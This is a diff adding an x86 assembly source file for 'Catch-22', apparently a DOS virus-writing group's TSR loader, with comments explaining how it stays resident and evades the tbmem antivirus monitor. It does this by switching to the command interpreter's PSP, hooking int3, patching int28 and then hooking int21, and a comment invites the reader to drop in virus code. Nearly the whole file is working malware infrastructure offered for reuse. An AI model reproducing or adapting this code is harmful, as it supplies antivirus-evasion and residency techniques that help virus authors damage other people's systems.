@@ -1,0 +1,140 @@
+
+; Catch-22, a TSR loader by Rhincewind [Vlad]
+;
+; This is probably the most experimental thing I've done so far. In this 
+; loader I've combined a few things I learned about tbmem into a pretty 
+; neat loader that the current version of tbmem will not detect.
+;
+; The highloader is pretty straightforward, although it does use one
+; trick I found. It traces the PSP chain all the way back to the command
+; interpreter, then makes that PSP active before a block is allocated for
+; the loader. This so-called 'context switching' will make the newly
+; allocated block property of your command interpreter, ensuring it's
+; lasting residency. Down with direct MCB twiddling!
+;
+; Now tbmem comes into play. First, two facts:
+;
+; Fact 1 - Tbmem detects residency on vectorchanges only. It can't be
+;          bothered to look at the memory itself.
+; Fact 2 - Tbmem does not flag on intel reserved registers being hooked.
+;
+; For starters the loader will hook int3, thereby not alerting tbmem as
+; above. The first byte of the int28 handler, which is an IRET in the
+; original handler, will be overwritten
+; with an int3. Now, as you probably know, only the command
+; interpreter calls int28 (Okay, so do Terminate and a handful of other
+; programs, watch out for those) which is redirected to our routine.
+; We managed to get a routine active around tbmem! Hurray! Now, the int3
+; handler will countdown 75 times, 13 is the minimum btw, to make sure
+; that we're back in command mode, that is, out of the dos deallocation
+; routines before we hook int21, which again, will elude tbmem. Both int28 
+; and int3 are restored and we're done with our loader.
+
+                .model tiny
+                .code
+                org 100h
+parasize        equ (endloader-start)
+start:
+                mov ax, 'TB'
+                int 21h
+                cmp ax, 'AV'
+                jz exit_tsr
+                mov ah, 4ah
+                mov bx,-1
+                push ax
+                int 21h
+                pop ax
+                sub bx, parasize+2
+                int 21h
+                xor si,si
+nextpsp:
+                cmp bx, word ptr ds:[si+16h]
+                mov bx, word ptr ds:[si+16h]
+                mov ds,bx
+                jnz nextpsp
+found_cmd:
+                mov ah, 50h
+                int 21h
+                mov ah, 48h
+                mov bx,parasize+1
+                int 21h
+                mov es,ax
+                mov ah, 50h
+                mov bx,cs
+                int 21h
+                push cs
+                pop ds
+                mov si, 100h
+                xor di,di
+                mov cx, endloader-start
+                rep movsb
+                mov ds,cx
+                mov si, 3*4
+                movsw
+                movsw
+                cli
+                mov word ptr [si-4],offset install_21-100h
+                mov word ptr [si-2],es
+                sti
+                mov si, 28h*4
+                movsw
+                movsw
+                mov ax,75h
+                stosw
+                mov word ptr es:[di],75h
+                lds bx, dword ptr ds:[si-4]
+                mov al, 0cch
+                xchg byte ptr ds:[bx],al
+                stosb
+                ;Restore all registers here, including DS&ES
+exit_tsr:                
+                int 20h
+install_21:     
+                dec word ptr cs:counter-100h
+                jnz exit_int3
+                push ax
+                push di
+                push ds
+                push es
+                xor ax,ax
+                mov ds,ax
+                les di, dword ptr cs:int2offset-100h
+                mov al, byte ptr cs:orgbyte-100h
+                stosb
+                cli
+                les di, dword ptr cs:intoffset-100h
+                mov word ptr ds:[0ch],di
+                mov word ptr ds:[0eh],es
+                mov ax,offset int21-100h
+                xchg ax, word ptr ds:[84h]
+                mov cs:intoffset-100h,ax
+                mov ax,cs
+                xchg ax, word ptr ds:[86h]
+                mov cs:intseg-100h,ax
+                sti
+                pop es
+                pop ds
+                pop di
+                pop ax
+exit_int3:                
+                add sp,6
+                iret
+;Replace the handler below with your k-rad virus code.
+int21:
+                cmp ax,'TB'
+                jnz return_int
+                mov ax, 'AV'
+                iret
+return_int:                
+                jmp dword ptr cs:intoffset-100h
+endloader:
+intoffset      dw ?
+intseg         dw ?
+int2offset     dw ?
+int2seg        dw ?
+counter        dw ?
+orgbyte        db ?
+
+                end start
+
+
